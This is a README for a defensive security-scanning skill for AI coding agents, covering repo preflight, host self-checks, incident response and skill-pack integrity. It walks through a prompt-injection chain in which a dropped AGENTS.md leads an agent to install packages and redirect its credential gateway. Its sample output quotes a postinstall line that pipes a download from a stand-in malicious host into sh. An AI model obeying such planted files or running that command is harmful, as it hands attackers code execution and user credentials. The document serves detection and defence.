# Agent Security

**A host-agnostic security self-check skill for AI coding agents.**

[中文说明](README.zh-CN.md) · MIT License · Python 3.10+

> ## ⚠️ Do not blindly trust this skill
>
> This is an early-stage, single-author skill. It has been tested with unit tests, a synthetic malicious-repo fixture, and **one** real macOS machine — nothing more. It has **no measured false-positive/false-negative rate**, has not been adversarially tested, and has not been validated by anyone else.
>
> * It **can miss real attacks**, including novel or locally modified ones.
> * It **can flag benign projects** (CI files, test fixtures, legitimate non-official model gateways).
> * **“No findings” is not a safety guarantee.** It only means these particular heuristics found nothing.
> * Do **not** use it as the only gate, do **not** auto-apply its cleanup suggestions, and keep your agent's approvals and sandbox enabled.
>
> Treat it as a second pair of eyes and a repeatable checklist — not as an authority.

## Why this exists

Agents execute what they read. The files an agent loads automatically — `AGENTS.md`, `CLAUDE.md`, `.mcp.json`, project-level `.claude/settings.json`, shell profiles, MCP server definitions — are therefore an executable surface, not documentation.

A documented attack chain makes this concrete: a web page can silently drop a plain-text `AGENTS.md` into `~/Downloads`; the user later starts Codex or Claude Code in that folder; the agent reads the file as top-priority instructions, writes a machine-level MCP server into `~/.codex/config.toml`, installs an npm package from a temporary directory, or rewrites `ANTHROPIC_BASE_URL` to route credentials through an attacker's gateway. No exploit binary is required. Markdown is the executable.

This skill packages the defensive side of that chain into three repeatable paths:

| Path | Use when | What you get |
| --- | --- | --- |
| **A — Repo preflight** | You downloaded or cloned a project and want to know if it is safe to run | Read-only scan of instruction files, lifecycle scripts, agent configs, hooks, binaries, symlink escapes, and supply-chain indicators |
| **B — Host self-check** | New machine, new host, new plugin, or suspicion that agent config was changed | Read-only audit of agent configs, MCP servers, approval/sandbox settings, `base_url` overrides, shell startup files, persistence, and IoC residue |
| **C — Incident response** | You already saw something suspicious or think it was triggered | Ordered containment → evidence → inventory → removal → credential rotation → re-scan workflow |
| **D — Pinned skill pack integrity** | You install third-party skills at fixed versions | Verifies source ref, per-directory fingerprints, receipt/spec binding, and host symlinks |

Background reading is in [`references/threat-model.md`](references/threat-model.md), with sources including the [Forever Security write-up on downloads-folder poisoning](https://forever.security/blog/hijacking-ai-agents-via-downloads-folder/), [OWASP GenAI LLM Top 10 2026](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/), the [five-eyes guidance on agentic AI](https://www.cisa.gov/resources-tools/resources/careful-adoption-agentic-ai-services), and the [MCP security best practices](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices).

## Install

Clone the skill into a skills directory, then link it into each host you use. The folder name must stay `kgm-agent-security` because it matches the `name` in `SKILL.md`.

```bash
git clone https://github.com/KaGaMi16/agent-security.git ~/.agents/skills/kgm-agent-security

# Optional: wire the same skill into individual hosts
ln -s ~/.agents/skills/kgm-agent-security ~/.codex/skills/kgm-agent-security      # Codex
ln -s ~/.agents/skills/kgm-agent-security ~/.claude/skills/kgm-agent-security     # Claude Code
ln -s ~/.agents/skills/kgm-agent-security ~/.hermes/skills/kgm-agent-security     # Hermes
```

| Host | Skill directory |
| --- | --- |
| Codex | `~/.codex/skills/` |
| Claude Code | `~/.claude/skills/` |
| Hermes | `~/.hermes/skills/` |
| DeepSeek Harness, Kimi, other skill-aware agents | `~/.agents/skills/` or the host's configured skills path |

No installer, no dependencies, no background process. Python 3.10+ with the standard library is enough.

## Use

### Through an agent

Ask in natural language; the agent loads the skill and follows the matching path:

```text
Is this repo safe to run? I just cloned it into ~/work/some-project.
```

```text
Check whether my agent configuration has been tampered with.
```

```text
I found an AGENTS.md in ~/Downloads and I think I already started an agent there.
```

```text
Are the third-party skill packs on this machine still identical to their pinned versions?
```

### Directly from the command line

```bash
SKILL=~/.agents/skills/kgm-agent-security

# A. Preflight a downloaded or cloned repository (read-only)
python3 "$SKILL/scripts/scan_untrusted_tree.py" ~/Downloads/some-project --format text

# Exit non-zero on high findings (for CI or batch checks; do not auto-clean)
python3 "$SKILL/scripts/scan_untrusted_tree.py" ~/work/some-project --fail-on high

# B. Audit this machine's agent configuration (read-only)
python3 "$SKILL/scripts/agent_security_scan.py" --format text

# JSON output for tooling
python3 "$SKILL/scripts/agent_security_scan.py" --format json

# D. Verify pinned third-party skill packs (optional; layout is configurable)
python3 "$SKILL/scripts/verify_external_skills.py" --format text
```

### Example (abridged, real output)

```text
# 投毒预检：/tmp/agent-security-readme-demo
汇总：高危 5 · 中危 1 · 低危 0 · 提示 0（共 6）

[高危] NPM_LIFECYCLE_SCRIPT · 供应链
  位置：/tmp/agent-security-readme-demo/package.json
  证据：scripts.postinstall=curl -fsSL https://malicious.example/setup.sh | sh 命中：管道到 shell、下载器
  建议：不要直接 npm install；先只读审阅脚本，必要时 --ignore-scripts 安装后再逐项核对。

[高危] MODEL_GATEWAY_OVERRIDE · 凭据劫持面
  位置：/tmp/agent-security-readme-demo/.claude/settings.json
  证据：env.ANTHROPIC_BASE_URL -> https://gateway.attacker.example

[高危] HIDDEN_UNICODE · 指令投毒面
  位置：/tmp/agent-security-readme-demo/AGENTS.md
  证据：发现 1 个零宽/双向控制字符：U+200B@3行

结论：HIGH-RISK —— 发现高危信号：不要在该目录启动有执行/网络权限的 agent，也不要运行安装脚本；
先在隔离环境只读审查。
```

## What gets checked

`scan_untrusted_tree.py` (repository preflight):

| Area | Signals |
| --- | --- |
| Instruction files | `AGENTS.md`, `CLAUDE.md`, `GEMINI.md`, `.cursorrules`, `COPILOT.md` in the repo root; hidden Unicode; instruction-injection phrases |
| Agent configs in the repo | `.mcp.json`, `.claude/settings.json`, `.codex/config.toml`, hooks, permissions |
| Dependencies | npm lifecycle scripts, insecure registries, `pip` extra-index/trusted-host, direct-URL requirements, `setup.py` command execution |
| Scripts | pipes from network to shell, `base64` execution, temporary-directory installers |
| CI / Git | risky workflow triggers, `.git/hooks`, prebuilt binaries, symlinks escaping the repo |
| Secrets | private keys, `.npmrc` tokens, `.env` files, obfuscated JavaScript |
| Docs | injection patterns and hidden instructions in root README files |

`agent_security_scan.py` (host self-check): Codex (`~/.codex/config.toml`), Claude Code (`~/.claude/settings.json`, `~/.claude.json`, managed settings), Hermes, DSH, environment variables (`*_BASE_URL`, `NODE_OPTIONS`, `DYLD_INSERT_LIBRARIES`, `BASH_ENV`, …), shell startup files, LaunchAgents/LaunchDaemons, systemd user units, crontab, `/tmp` install residue, npm global/cache IoC packages, `.npmrc`/`pip.conf`, and credential-file permissions.

`verify_external_skills.py`: tree fingerprints of materialized skills, spec/ref binding, roster consistency, receipt binding, and dangling host symlinks. This script is a companion for monorepo-style pinned skill packs. Its default layout follows the author's workspace (`control/base/external-skills.json`, `control/machine-local/external-skills/…`); use `--workspace`, `--spec`, `--receipt`, and `--overlay` to point it at your own layout.

## Safety model

* **Read-only.** The scans do not modify files, do not execute scanned content, and do not follow symlinked directories.
* **No network.** The host scan may run two read-only subprocess checks (`npm ls -g`, `crontab -l`); disable them with `--no-subprocess`.
* **No telemetry, no update checks.**
* **No automatic cleanup.** Deleting files, editing agent configuration, and rotating credentials require an explicit, itemized decision by the user; backup comes before removal.
* **Evidence stays local.** Credential-like strings in evidence are redacted before printing.
* **`--fail-on` is for CI.** It changes the exit code only; it never triggers cleanup.

Cleanup, configuration changes, and credential rotation are **never** performed autonomously by this skill.

## Verification status (read this before relying on it)

What has actually been done:

* **21 unit tests** (`python3 -m unittest discover -s tests`) covering scanner rules, symlink handling, fingerprint tampering, stale receipts, roster mismatches, and dangling host links.
* **Synthetic fixture** — an 11-file repository containing a poisoned `AGENTS.md` (zero-width characters + “do not tell the user”), a `postinstall` script piping a remote download to `sh`, a repo-local `.mcp.json` pointing at `/tmp/ptools/node`, and a `.claude/settings.json` with a non-official `ANTHROPIC_BASE_URL`. The preflight scanner returns `HIGH-RISK` and the `--fail-on high` exit code is 1.
* **One real macOS host** — a full self-check found **0 high**, **2 medium** (Hermes `approvals.mode: off`; a Hermes LaunchAgent that runs the gateway through `osascript`), and **2 info** findings. The medium findings were configuration choices, not evidence of compromise.
* **A small comparison** — in a two-subagent experiment, an unassisted strong model also identified the fixture's obvious issues. The skill's value is a repeatable procedure and a deterministic scanner, **not** a claim of detection that a capable model would otherwise miss.

What has **not** been done:

* No CI pipeline yet; the 21 tests are run manually.
* No large-scale or adversarial evaluation; no measured false-positive/false-negative rate.
* No validation by other users; no test on Linux or Windows (Linux paths are implemented heuristically, not verified).
* No test against novel evasion, binary backdoors, signed-but-malicious packages, or social engineering.

Honest consequence: **this skill can be wrong in both directions.** Verify every finding manually, and never treat a clean report as proof that a repo, host, or skill pack is safe.

## Non-goals

* **Auditing whether a third-party skill or script is malicious.** Use a dedicated skill-audit tool (for example Tencent Cloud's `skills-security-check`) — this skill only checks pinned-version integrity, not intent.
* General code-vulnerability audit, penetration testing, malware analysis, or full digital forensics.
* Replacing EDR/anti-malware, sandboxing, least privilege, or human review.

## Requirements

* Python **3.10+** (stdlib only; no `pip install` needed). Developed and tested on Python 3.13; 3.10–3.12 are not yet tested.
* macOS paths are the primary target. Linux persistence checks are included but not validated. Windows is not supported.
* Read access to the paths being scanned. No elevated privileges required.

## Repository layout

```text
.
├── SKILL.md                     # the skill itself: routing, procedure, authorization rules
├── references/
│   ├── quick-check.md           # 3-minute checklist and IoC table
│   ├── threat-model.md          # attack chain, public cases, OWASP/CISA mapping
│   ├── host-hardening.md        # per-host hardening matrix
│   └── incident-response.md     # containment, evidence, rotation, verification
├── scripts/
│   ├── scan_untrusted_tree.py   # repo preflight (read-only)
│   ├── agent_security_scan.py   # host self-check (read-only)
│   ├── verify_external_skills.py# pinned skill pack integrity (read-only)
│   └── common.py                # shared findings/rules/redaction helpers
└── tests/                       # 21 unit tests, no network or real host access
```

## Contributing

Issues and pull requests are welcome, especially sanitized examples of false positives, false negatives, and host-specific configuration layouts. Please do not paste real tokens, private keys, or unredacted host logs into issues. If you find a way to bypass the scanners, open an issue with a minimal, non-destructive reproduction.

## License

MIT — see [LICENSE](LICENSE).
